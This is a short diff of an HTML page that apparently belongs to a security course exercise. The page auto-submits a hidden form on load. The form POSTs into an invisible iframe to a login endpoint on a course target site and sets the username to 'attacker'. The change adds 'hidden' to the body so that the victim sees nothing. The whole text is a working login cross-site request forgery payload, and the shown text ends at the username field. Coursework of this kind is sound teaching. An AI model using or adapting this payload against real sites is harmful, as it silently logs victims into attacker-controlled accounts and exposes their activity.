@@ -1,5 +1,5 @@
 <html>
-	<body onload="document.forms[0].submit()">
+	<body hidden onload="document.forms[0].submit()">
 		<iframe hidden name="invisframe" ></iframe>
 		<form action="http://bungle.cs.virginia.edu/login?csrfdefense=0&xssdefense=5" method="POST" target="invisframe">
 			<input type="hidden" name="username" value="attacker" />
